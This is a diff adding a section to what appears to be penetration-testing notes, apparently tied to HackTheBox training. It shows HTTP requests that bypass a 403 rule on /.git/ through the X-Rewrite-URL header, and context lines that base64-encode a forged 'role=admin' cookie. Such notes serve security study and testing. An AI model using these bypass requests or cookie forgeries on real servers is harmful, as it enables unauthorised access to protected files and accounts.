@@ -64,4 +64,23 @@ echo -n 'user=htb-stdnt;role=admin' | base64
 
 dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg==
 ```
+## Headers
+### X-Original-Url / X-Rewrite-Url
 
+First, normal request returns 403:
+```
+GET /.git/ HTTP/1.1
+Host: example.com
+```
+This attempt to bypass will return 403 too, because URI hasn't changed and the rule still applies:
+```
+GET /.git/ HTTP/1.1
+Host: example.com
+X-Rewrite-URL: /.git/
+```
+This one should bypass the restriction:
+```
+GET / HTTP/1.1
+Host: example.com
+X-Rewrite-URL: /.git/
+```
